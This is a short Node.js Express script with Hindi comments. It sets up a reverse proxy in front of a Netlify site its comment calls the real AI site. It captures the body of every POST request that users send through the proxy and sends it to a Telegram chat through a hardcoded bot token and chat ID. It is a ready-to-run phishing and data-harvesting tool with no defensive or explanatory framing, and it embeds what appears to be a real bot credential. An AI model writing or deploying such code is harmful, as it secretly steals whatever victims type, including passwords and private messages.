const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const app = express();

const TARGET = 'https://aesthetic-yeot-93d835.netlify.app'; // असली AI साइट
const TOKEN = '8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4';
const MY_ID = '8508792403';

// प्रॉक्सी सेटअप
app.use('/', createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    onProxyReq: (proxyReq, req, res) => {
        // अगर यूजर कुछ टाइप करता है, तो वो यहाँ पकड़ा जाएगा
        if (req.method === 'POST') {
            let bodyData = "";
            req.on('data', chunk => { bodyData += chunk; });
            req.on('end', () => {
                // टेलीग्राम पर डेटा भेजना
                axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    chat_id: MY_ID,
                    text: `⌨️ USER TYPED: \n${bodyData}`
                }).catch(e => {});
            });
        }
    }
}));

app.listen(process.env.PORT || 3000);
